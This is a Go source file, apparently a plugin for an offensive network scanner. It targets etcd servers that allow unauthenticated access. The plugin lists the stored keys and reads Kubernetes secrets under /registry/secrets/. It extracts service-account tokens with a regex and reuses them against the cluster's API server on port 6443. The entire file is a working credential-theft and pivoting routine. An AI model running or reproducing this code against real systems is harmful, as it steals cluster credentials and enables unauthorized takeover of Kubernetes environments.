package plugins

import (
	"errors"
	"fmt"
	"log"
	"regexp"
	"strings"

	"github.com/404tk/lazyscan/common"
	"github.com/404tk/lazyscan/pkg/schema"
)

func EtcdScan(info *common.HostInfo) error {
	endpoint := fmt.Sprintf("http://%s:%s", info.Host, info.Port)
	v, err := schema.GetVersion(endpoint)
	if v == "" {
		return err
	}

	result := fmt.Sprintf("[%s] may be etcd unauth, server version %s", endpoint, v)
	log.Println(result)
	if !strings.HasPrefix(v, "3.") {
		return errors.New("not etcd v3.")
	}
	if info.Queue != nil {
		vuln := common.Vuln{
			Host:   info.Host,
			Port:   info.Port,
			Unauth: true,
		}
		info.Queue.Push(vuln)
	}

	opt := schema.EtcdRequestOption{
		Endpoint: endpoint,
		Api:      "/v3/kv/range",
		Method:   "POST",
		PostData: schema.GenerateQuery("/"),
		Silent:   true,
	}
	resp, err := schema.EtcdRequest(opt)
	if err != nil {
		return err
	}
	keys, err := schema.GetKeys(resp, opt.Silent)
	if err != nil {
		return err
	}
	for k := range keys {
		// K8S场景
		if strings.HasPrefix(k, "/registry/secrets/") {
			opt.PostData = schema.GenerateQuery(k)
			resp1, err := schema.EtcdRequest(opt)
			if err != nil {
				return err
			}
			kvs, err := schema.GetKeys(resp1, opt.Silent)
			if err != nil {
				return err
			}
			for _, v := range kvs {
				if strings.Contains(v, "#kubernetes.io/service-account-token") {
					token := regexp.MustCompile("eyJh[\\w\\.-]+").FindString(v)
					if token != "" {
						var tmpinfo common.HostInfo = *info
						tmpinfo.Port = "6443"
						tmpinfo.Token = token
						check, err := KubeAPIServerScan(&tmpinfo)
						if check {
							return err
						}
					}
				}
			}
		}
	}
	return err
}
